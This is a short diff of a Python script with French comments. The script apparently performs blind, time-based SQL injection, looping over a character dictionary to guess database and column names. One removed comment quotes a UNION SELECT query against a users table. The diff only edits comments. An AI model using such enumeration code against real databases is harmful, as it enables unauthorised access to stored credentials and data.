@@ -19,7 +19,7 @@ def db_name():
     texte = ""
     TIME = 5
 
-    # cherche le nombre de colonne que va utiliser la requête sql "SELECT username as column1, password as column2, email as column3 FROM users UNION SELECT '1' AS column1, '2' AS column2, '3' AS column3"
+    # cherche le nombre de colonne que va utiliser la requête sql (juste username + password donc 2)
     for letter in dictionary:
         for num in range(1, 10):
             nums = ",{}".format(",".join([str(i) for i in range(1, num + 1)]))
@@ -161,7 +161,7 @@ def column_name(database, nom_table):
     a = 0
     texte = ""
     TIME = 5
-    # Boucle principale pour tester les noms de colonnes
+    # boucle principale pour tester les noms de colonnes
     for i in range(1, 50):
         for j in range(0, len(dictionary)):
             # Si le compteur a atteint une certaine valeur, on ajoute le nom de colonne testé à la liste des noms de colonnes
